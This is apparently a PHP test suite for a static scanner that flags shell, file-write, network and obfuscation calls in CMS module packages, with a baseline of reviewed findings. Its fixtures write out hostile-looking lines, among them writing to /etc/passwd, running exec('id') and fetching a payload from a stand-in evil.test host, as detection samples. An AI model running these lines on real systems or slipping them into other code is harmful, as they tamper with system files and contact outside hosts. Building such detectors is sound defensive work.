<?php

declare(strict_types=1);

use Cms\Core\Services\Modules\Packages\PackageStaticScan;

uses(Cms\Core\Tests\TestCase::class);

/**
 * Agreed baseline of the published (packageable) iSPA modules, recorded 2026-11-15 for per module,
 * "<category> <rule> <file>" => number of findings. Every finding is a reviewed, legitimate use (HTTP clients of the
 * module's own integrations, Automation's git/worktree runner, Widget's artifact blob store, JWT/APNs/attachment
 * base64 decoding). A module that gains a finding beyond this list fails the test: review the new code, then update
 * the baseline in the same commit.
 */
const PSS_BASELINE = [
    'Account' => [],
    'Achievements' => [],
    'AffiliateRecommendation' => [],
    'AutoDiscover' => [
        'network Http app/Services/AutoDiscoverFrontierCrawler.php' => 1,
    ],
    'Automation' => [
        'file_write File::copy app/Services/AutomationExecutor.php' => 1,
        'file_write File::ensureDirectoryExists app/Services/AutomationExecutor.php' => 5,
        'file_write File::put app/Services/AutomationExecutor.php' => 5,
        'file_write chmod app/Services/AutomationExecutor.php' => 1,
        'file_write mkdir app/Services/StocksAnalysisRunner.php' => 2,
        'network Http app/Services/AutomationChatResponder.php' => 2,
        'network Http app/Services/BotATaskAnalyzer.php' => 2,
        'network Http app/Services/ClickUpClient.php' => 1,
        'network Http app/Services/StocksTelegramClient.php' => 4,
        'network Http app/Services/TelegramBotClient.php' => 5,
        'shell Process app/Services/AutomationChatResponder.php' => 1,
        'shell Process app/Services/AutomationExecutor.php' => 5,
        'shell Process app/Services/AutomationOpsCoordinator.php' => 1,
        'shell Process app/Services/StocksAnalysisRunner.php' => 1,
    ],
    'ClassOnline' => [],
    'Content' => [],
    'CustomAds' => [],
    'DigitalLibrary' => [],
    'Ecommerce' => [],
    'SampleGuide' => [
        'network Http app/Services/SourceHealth/SampleGuideSourceFetcher.php' => 1,
    ],
    'Inventory' => [],
    'Journal' => [],
    'MobileApp' => [],
    'Product' => [],
    'PushNotification' => [
        'network Http app/Services/ApnsPushNotificationProvider.php' => 1,
        'network Http app/Services/FcmPushNotificationProvider.php' => 2,
        'obfuscation base64_decode app/Services/ApnsPushNotificationProvider.php' => 1,
        'obfuscation base64_decode app/Services/FcmPushNotificationProvider.php' => 1,
    ],
    'RealEstate' => [],
    'SaleHunting' => [
        'network Http app/Console/AutopilotStatusCommand.php' => 1,
        'network Http app/Services/AccessTradeCampaignImporter.php' => 3,
        'network Http app/Services/AccessTradeCampaignRegistrar.php' => 3,
        'network Http app/Services/AccessTradeCouponImporter.php' => 1,
        'network Http app/Services/EcoMobiOfferImporter.php' => 3,
        'network Http app/Services/MasOfferPromotionImporter.php' => 2,
        'network Http app/Services/Pub2CouponImporter.php' => 3,
        'network Http app/Services/SaleHuntingDealLinkHealthChecker.php' => 1,
        'shell Process app/Services/Pub2ProductFeedLinker.php' => 1,
    ],
    'SocialAuth' => [
        'network Http app/Services/AppleNotificationService.php' => 1,
        'network Http app/Services/AppleOAuthCallbackService.php' => 1,
        'network Http app/Services/JwtIdentityTokenVerifier.php' => 1,
        'obfuscation base64_decode app/Services/AppleClientSecretFactory.php' => 1,
        'obfuscation base64_decode app/Services/AppleNotificationService.php' => 1,
        'obfuscation base64_decode app/Services/JwtIdentityTokenVerifier.php' => 1,
    ],
    'Webmail' => [
        'network Http app/Http/Controllers/V2/Admin/FileController.php' => 1,
        'network Http app/Services/BodyFetcher.php' => 1,
        'network Http app/Services/HubClient.php' => 2,
        'obfuscation base64_decode app/Services/BodyFetcher.php' => 1,
        'obfuscation base64_decode app/Services/ComposeService.php' => 4,
        'obfuscation base64_decode app/Services/OutboundRecorder.php' => 1,
    ],
    'Widget' => [
        'file_write chmod app/Rendering/Artifacts/FilesystemWidgetArtifactBlobStore.php' => 1,
        'file_write fopen app/Rendering/Artifacts/FilesystemWidgetArtifactBlobStore.php' => 1,
        'file_write mkdir app/Rendering/Artifacts/FilesystemWidgetArtifactBlobStore.php' => 1,
        'file_write rename app/Rendering/Artifacts/FilesystemWidgetArtifactBlobStore.php' => 1,
        'file_write unlink app/Rendering/Artifacts/FilesystemWidgetArtifactBlobStore.php' => 1,
    ],
];

/**
 * Remove a temp tree (symlinks are unlinked, never followed).
 */
function pssRemove(string $path): void
{
    if (is_link($path) || is_file($path)) {
        unlink($path);

        return;
    }
    if (!is_dir($path)) {
        return;
    }
    foreach (array_diff(scandir($path) ?: [], ['.', '..']) as $entry) {
        pssRemove($path . '/' . $entry);
    }
    rmdir($path);
}

/**
 * Create a temp module folder holding the given files; returns the module folder.
 *
 * @param array<string, string> $files relative path => contents
 */
function pssFixture(array $files): string
{
    $dir = sys_get_temp_dir() . '/pss-' . bin2hex(random_bytes(6)) . '/Demo';
    foreach ($files as $relative => $contents) {
        @mkdir(dirname($dir . '/' . $relative), 0775, true);
        file_put_contents($dir . '/' . $relative, $contents);
    }

    return $dir;
}

/**
 * Findings reduced to "<category> <rule> <file>:<line>", sorted.
 *
 * @param list<array{category: string, rule: string, file: string, line: int}> $findings
 *
 * @return list<string>
 */
function pssKeys(array $findings): array
{
    $keys = array_map(static fn (array $f): string => $f['category'] . ' ' . $f['rule'] . ' ' . $f['file'] . ':' . $f['line'], $findings);
    sort($keys);

    return $keys;
}

it('flags every listed PHP pattern with its file and line', function () {
    $encoded = str_repeat('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo', 8);
    $dir = pssFixture(['app/Bad.php' => implode("\n", [
        '<?php',
        "exec('ls');",
        "\$o = shell_exec('ls');",
        "system('ls');",
        "passthru('ls');",
        "proc_open('ls', [], \$p);",
        "popen('ls', 'r');",
        '$x = `ls -la`;',
        "\$p = new Process(['ls']);",
        "Process::run('ls');",
        "file_put_contents('/etc/passwd', 'x');",
        "\$h = fopen(\$path, 'w');",
        "unlink(storage_path('x'));",
        "File::put('/tmp/x', 'y');",
        "mkdir('/var/www/x');",
        "curl_init('https://evil.test');",
        "fsockopen('evil.test', 80);",
        "Http::get('https://evil.test');",
        '$c = new \GuzzleHttp\Client();',
        "file_get_contents('https://evil.test/payload');",
        'eval($code);',
        'base64_decode($blob);',
        'gzinflate($blob);',
        'str_rot13($s);',
        "create_function('\$a', 'return 1;');",
        'assert($cond);',
        "preg_replace('/x/e', 'y', \$s);",
        "\$enc = '" . $encoded . "';",
        '$hex = "\x65\x76\x61\x6c\x28\x24\x5f\x47";',
        "mail('a@b.test', 's', 'm');",
        "\$s = new SoapClient('https://evil.test?wsdl');",
        "stream_socket_client('tcp://evil.test:80');",
        "\\exec('id');",
        '',
    ])]);
    try {
        $findings = (new PackageStaticScan())->scan($dir);

        expect(pssKeys($findings))->toEqualCanonicalizing([
            'shell exec app/Bad.php:2', 'shell shell_exec app/Bad.php:3', 'shell system app/Bad.php:4',
            'shell passthru app/Bad.php:5', 'shell proc_open app/Bad.php:6', 'shell popen app/Bad.php:7',
            'shell backtick app/Bad.php:8', 'shell Process app/Bad.php:9', 'shell Process app/Bad.php:10',
            'file_write file_put_contents app/Bad.php:11', 'file_write fopen app/Bad.php:12',
            'file_write unlink app/Bad.php:13', 'file_write File::put app/Bad.php:14', 'file_write mkdir app/Bad.php:15',
            'network curl_init app/Bad.php:16', 'network fsockopen app/Bad.php:17', 'network Http app/Bad.php:18',
            'network guzzle app/Bad.php:19', 'network file_get_contents url app/Bad.php:20',
            'obfuscation eval app/Bad.php:21', 'obfuscation base64_decode app/Bad.php:22',
            'obfuscation gzinflate app/Bad.php:23', 'obfuscation str_rot13 app/Bad.php:24',
            'obfuscation create_function app/Bad.php:25', 'obfuscation assert app/Bad.php:26',
            'obfuscation preg_replace /e app/Bad.php:27', 'obfuscation encoded string app/Bad.php:28',
            'obfuscation hex escapes app/Bad.php:29', 'network mail app/Bad.php:30', 'network SoapClient app/Bad.php:31',
            'network stream_socket_client app/Bad.php:32', 'shell exec app/Bad.php:33',
        ])
            ->and($findings[0])->toHaveKeys(['category', 'rule', 'file', 'line', 'excerpt'])
            ->and(collect($findings)->firstWhere('line', 2)['excerpt'])->toBe("exec('ls');");
    } finally {
        pssRemove(dirname($dir));
    }
});

it('does not flag methods, declarations, comments, strings, module-local writes, php:// streams or read-only calls', function () {
    $dir = pssFixture(['app/Good.php' => <<<'PHP'
<?php
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Support\Facades\Storage;

class A
{
    public function exec($x) { return $x; }

    public function run(): void
    {
        $this->exec('a');
        static::system('b');
        $s = 'exec(1); eval(2)';
        // exec('commented');
        /* shell_exec('x') */
        file_put_contents(__DIR__ . '/cache.json', '{}');
        mkdir(dirname(__DIR__) . '/storage');
        unlink(module_path('Demo', 'x'));
        $h = fopen('php://output', 'w');
        fwrite($h, 'row');
        $r = fopen($path, 'rb');
        Storage::put('a', 'b');
        $c = Process::class;
        $f = File::get($path);
        $d = base64_encode('x');
        $g = file_get_contents($path);
    }
}
PHP]);
    try {
        expect((new PackageStaticScan())->scan($dir))->toBe([]);
    } finally {
        pssRemove(dirname($dir));
    }
});

it('flags the listed script patterns and not same-origin calls or header strings', function () {
    $encoded = str_repeat('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo', 8);
    $dir = pssFixture(['admin/x.js' => implode("\n", [
        "const a = eval('1')",
        "const f = new Function('return 1')",
        "fetch('https://evil.test/x')",
        "axios.post('//evil.test/y', {})",
        "const ws = new WebSocket('wss://evil.test')",
        "navigator.sendBeacon('/x', 'y')",
        'const xhr = new XMLHttpRequest()',
        "const ok = fetch('/api/local')",
        "const headers = { 'X-Requested-With': 'XMLHttpRequest' }",
        "const blob = '" . $encoded . "'",
        '',
    ])]);
    try {
        expect(pssKeys((new PackageStaticScan())->scan($dir)))->toEqualCanonicalizing([
            'obfuscation eval admin/x.js:1', 'obfuscation new Function admin/x.js:2', 'network fetch admin/x.js:3',
            'network axios admin/x.js:4', 'network WebSocket admin/x.js:5', 'network sendBeacon admin/x.js:6',
            'network XMLHttpRequest admin/x.js:7', 'obfuscation encoded string admin/x.js:10',
        ]);
    } finally {
        pssRemove(dirname($dir));
    }
});

it('scans every file of an extracted package and skips unpackaged folders only for a source tree', function () {
    $dir = pssFixture(['tests/Evil.php' => "<?php\nexec('id');\n", 'node_modules/x/i.js' => "eval('1')\n", 'app/Ok.php' => "<?php\n"]);
    try {
        $scan = new PackageStaticScan();
        expect(pssKeys($scan->scan($dir)))->toBe(['obfuscation eval node_modules/x/i.js:1', 'shell exec tests/Evil.php:2'])
            ->and($scan->scan($dir, true))->toBe([])
            ->and(PackageStaticScan::summary($scan->scan($dir)))->toBe(['shell' => 1, 'file_write' => 0, 'network' => 0, 'obfuscation' => 1]);
    } finally {
        pssRemove(dirname($dir));
    }
});

it('only reads files: nothing runs, nothing changes and symlinks are not followed', function () {
    $outside = sys_get_temp_dir() . '/pss-out-' . bin2hex(random_bytes(6)) . '.php';
    file_put_contents($outside, "<?php\nexec('id');\n");
    $dir = pssFixture([
        'app/Boom.php' => "<?php\nfile_put_contents(__DIR__ . '/../executed', 'x');\nexec('touch ' . __DIR__ . '/../executed2');\n",
        'admin/boom.js' => "eval('1')\n",
    ]);
    symlink($outside, $dir . '/app/Linked.php');
    try {
        $snapshot = static function (string $root): array {
            $out = [];
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($it as $file) {
                $out[substr($file->getPathname(), strlen($root))] = $file->isLink() ? 'link' : ($file->isFile() ? hash_file('sha256', $file->getPathname()) . '@' . $file->getMTime() : 'dir');
            }
            ksort($out);

            return $out;
        };
        $before = $snapshot($dir);
        $findings = (new PackageStaticScan())->scan($dir);

        expect($snapshot($dir))->toBe($before)
            ->and(is_file($dir . '/executed'))->toBeFalse()
            ->and(is_file($dir . '/executed2'))->toBeFalse()
            ->and(array_column($findings, 'file'))->not->toContain('app/Linked.php')
            ->and(pssKeys($findings))->toBe(['obfuscation eval admin/boom.js:1', 'shell exec app/Boom.php:3']);
    } finally {
        pssRemove(dirname($dir));
        @unlink($outside);
    }
});

it('does not flag the published iSPA modules beyond the agreed baseline', function (string $module) {
    $dir = base_path('cms/' . $module);
    if (!is_dir($dir)) {
        $this->markTestSkipped($module . ' is not in this checkout.');
    }
    $counts = [];
    foreach ((new PackageStaticScan())->scan($dir, true) as $finding) {
        $key = $finding['category'] . ' ' . $finding['rule'] . ' ' . $finding['file'];
        $counts[$key] = ($counts[$key] ?? 0) + 1;
    }
    ksort($counts);

    expect($counts)->toBe(PSS_BASELINE[$module]);
})->with(array_keys(PSS_BASELINE));
